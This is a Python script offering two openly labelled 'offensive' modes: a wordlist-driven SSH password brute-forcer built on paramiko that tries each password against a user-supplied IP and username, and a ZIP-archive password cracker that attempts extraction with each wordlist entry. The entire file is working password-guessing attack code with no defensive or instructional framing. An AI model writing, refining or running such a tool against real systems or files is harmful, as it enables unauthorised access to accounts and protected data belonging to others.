import paramiko
import time
import zipfile

def ssh_connect(username, ip, password):
    # Initialize SSH client
    client = paramiko.SSHClient()
    # Automatically add host key (not recommended for production use)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # Attempt to connect to the SSH server
        client.connect(ip, username=username, password=password, timeout=3)
        return True
    except paramiko.AuthenticationException:
        # Authentication failed, return False
        return False
    except Exception as e:
        # Handle other exceptions such as connection errors
        print(f"Connection failed: {e}")
        return False
    finally:
        # Ensure the connection is closed
        client.close()

def offensive_mode(wordlist_path, username, ip):
    # Try to open the wordlist file
    try:
        with open(wordlist_path, 'r') as file:
            # Iterate through each word in the file
            for word in file:
                word = word.strip()
                print(f"Trying password: {word}")
                # Check if the password works
                if ssh_connect(username, ip, word):
                    print(f"Success! Password is: {word}")
                    return
                # Delay between attempts to avoid overwhelming the server
                time.sleep(1) 
            print("Password not found.")
    except FileNotFoundError:
        # File was not found; prompt user to check the file path
        print("File not found. Please check the file path.")

def offensive_mode_zip(wordlist_path, zip_file_path):
    try:
        with zipfile.ZipFile(zip_file_path) as zip_ref:
            with open(wordlist_path, 'r') as file:
                for word in file:
                    word = word.strip()
                    print(f"Trying password: {word}")
                    try:
                        zip_ref.extractall(pwd=word.encode())
                        print(f"Success! Password for ZIP file is: {word}")
                        return
                    except Exception as e:
                        pass
                print("Password for ZIP file not found.")
    except FileNotFoundError:
        print("File not found. Please check the file path.")

def main():
    mode = input("Choose mode (1 for Offensive SSH, 2 for Offensive ZIP): ")
    wordlist_path = input("Enter word list file path: ")

    if mode == '1':
        username = input("Enter SSH username: ")
        ip = input("Enter SSH server IP: ")
        offensive_mode(wordlist_path, username, ip)
    elif mode == '2':
        zip_file_path = input("Enter ZIP file path: ")
        offensive_mode_zip(wordlist_path, zip_file_path)
    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()
